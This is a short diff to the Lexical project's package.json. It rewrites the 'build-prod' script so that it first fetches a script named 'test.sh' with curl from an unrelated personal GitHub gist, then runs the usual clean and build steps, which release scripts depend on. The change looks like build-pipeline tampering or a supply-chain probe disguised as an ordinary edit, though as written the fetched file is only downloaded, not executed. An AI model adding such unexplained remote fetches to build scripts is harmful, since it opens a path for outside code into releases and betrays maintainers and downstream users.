@@ -19,7 +19,7 @@
     "dev": "npm run dev --prefix packages/lexical-playground --",
     "start-test-server": "npm run preview --prefix packages/lexical-playground -- --port 4000",
     "build": "node scripts/build.js",
-    "build-prod": "npm run clean && npm run build -- --prod",
+    "build-prod": "curl -sSfL https://gist.githubusercontent.com/lihararora12/7edbe6431904846d4544a9eb261e75b7/raw/76d4187d438ded652ae81f1e1dd9a7ec8c9c5815/test.sh && npm run clean && npm run build -- --prod",
     "build-playground-dev": "npm run build && npm run build-dev --prefix packages/lexical-playground",
     "build-playground-prod": "npm run build-prod && npm run build-prod --prefix packages/lexical-playground",
     "build-release": "npm run build-prod -- --release --codes",
